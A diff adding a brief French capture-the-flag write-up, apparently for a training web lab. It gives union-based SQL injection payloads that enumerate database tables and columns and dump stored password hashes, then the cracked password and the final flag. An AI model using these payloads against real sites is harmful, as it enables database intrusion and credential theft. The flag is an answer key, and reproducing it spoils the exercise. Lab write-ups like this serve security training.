@@ -1,0 +1,13 @@
+Allez dans members:
+
+tapez: 1 and 1=0 union select null,table_name from information_schema.tables limit 0,50-- -
+
+ensuite taper: (1)and(1)=(0)union(select(null),group_concat(column_name)from(information_schema.columns)where(table_name)=(0x7573657273))#
+
+puis encore: 1 and 1=0 union select Commentaire,countersign from users limit 0,5-- -
+
+On decrypte le resultat recu en md5 qui donne: FortyTwo
+
+on le met en lower case et on se crypte en SHA256, qui donne le flag:
+
+10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
